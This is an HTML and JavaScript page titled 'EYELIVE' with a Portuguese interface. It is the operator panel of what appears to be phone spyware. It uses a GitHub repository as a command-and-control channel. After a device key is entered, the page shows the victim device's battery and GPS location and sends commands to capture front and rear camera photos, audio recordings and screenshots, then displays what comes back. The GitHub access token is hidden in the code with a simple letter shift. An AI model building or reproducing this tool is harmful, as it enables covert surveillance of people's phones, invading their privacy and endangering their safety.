<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8"><title>EYELIVE</title>
    <style>
        body{background:#000;color:#fff;font-family:monospace;padding:15px;max-width:450px;margin:0 auto}
        input,button{width:100%;padding:15px;margin:5px 0;background:#111;border:1px solid #333;color:#fff;font-size:16px;box-sizing:border-box}
        button{background:#ffd700;color:#000;font-weight:bold;cursor:pointer}
        .green{background:#00ff88;color:#000}.red{background:#ff4400;color:#fff}
        .box{background:#111;padding:15px;margin:10px 0;border-radius:10px;min-height:80px;word-break:break-all}
        img{width:100%;border-radius:10px;margin:10px 0}audio{width:100%}
    </style>
</head>
<body>
    <h1>EYELIVE</h1>
    <input type="text" id="key" placeholder="CHAVE do dispositivo">
    <button onclick="buscar()">🔍 CONECTAR</button>
    <div id="painel" style="display:none">
        <button onclick="cmd('status')">📊 STATUS</button>
        <button class="green" onclick="cmd('foto_frontal')">📸 FRONTAL</button>
        <button class="green" onclick="cmd('foto_traseira')">📸 TRASEIRA</button>
        <button class="red" onclick="cmd('audio')">🎤 AUDIO</button>
        <button onclick="cmd('screenshot')">📱 SCREENSHOT</button>
    </div>
    <div class="box" id="resultado">👆 Cole a CHAVE e clique CONECTAR</div>

<script>
function decToken(){
    var t="now_GrNCw79zDXH35E5ZpTii6RA9bDf4yY3Zf6Da";var r="";
    for(var i=0;i<t.length;i++){
        var c=t[i];
        if(c.match(/[a-zA-Z]/)){var b=c===c.toUpperCase()?65:97;r+=String.fromCharCode((c.charCodeAt(0)-b-7+26)%26+b)}
        else{r+=c}
    }
    return r;
}
var T=decToken(),H={'Authorization':'token '+T,'Accept':'application/vnd.github.v3+json'},KEY='',B='https://api.github.com/repos/gynbetfc/eyelive/contents';

async function buscar(){
    KEY=document.getElementById('key').value.trim();
    if(!KEY){alert('Cole a chave!');return}
    try{
        var r=await fetch(B+'/dados/'+KEY+'/status.json',{headers:H});
        if(r.ok){
            var d=JSON.parse(atob((await r.json()).content));
            document.getElementById('resultado').innerHTML='<p style=color:#0f0>✅ ONLINE</p><p>🔋 <b style=color:#0f0;font-size:2em>'+d.bateria+'</b></p><p>🕐 '+d.time+'</p><p>📍 '+JSON.stringify(d.gps)+'</p>';
            document.getElementById('painel').style.display='block';
            localStorage.setItem('ek',KEY);
        }else{document.getElementById('resultado').innerHTML='<p style=color:red>❌ OFFLINE</p>'}
    }catch(e){document.getElementById('resultado').textContent='Erro'}
}

async function cmd(c){
    document.getElementById('resultado').innerHTML='⏳ '+c+'...';
    try{
        var data={cmd:c};
        var content=btoa(JSON.stringify(data));
        var url=B+'/comandos/'+KEY+'.json';
        var check=await fetch(url,{headers:H});
        var body={message:'CMD',content:content,branch:'main'};
        if(check.ok)body.sha=(await check.json()).sha;
        await fetch(url,{method:'PUT',headers:H,body:JSON.stringify(body)});
        document.getElementById('resultado').innerHTML='⏳ Aguardando resposta (15s)...';
        await new Promise(r=>setTimeout(r,15000));
        var resp=await fetch(B+'/dados/'+KEY,{headers:H});
        if(resp.ok){
            var files=await resp.json();
            for(var i=files.length-1;i>=0;i--){
                if(files[i].name.includes(c)){
                    var rd=await fetch(files[i].url,{headers:H});
                    var d=JSON.parse(atob((await rd.json()).content));
                    if(d.result&&d.result.length>100){
                        if(c.includes('foto')||c.includes('screen'))document.getElementById('resultado').innerHTML='<img src="data:image/'+(c.includes('screen')?'png':'jpeg')+';base64,'+d.result+'">';
                        else if(c=='audio')document.getElementById('resultado').innerHTML='<audio controls src="data:audio/aac;base64,'+d.result+'"></audio>';
                    }else{document.getElementById('resultado').textContent=JSON.stringify(d)}
                    break;
                }
            }
        }
    }catch(e){document.getElementById('resultado').textContent='Erro'}
}

var s=localStorage.getItem('ek');if(s){document.getElementById('key').value=s;buscar()}
</script>
</body>
</html>
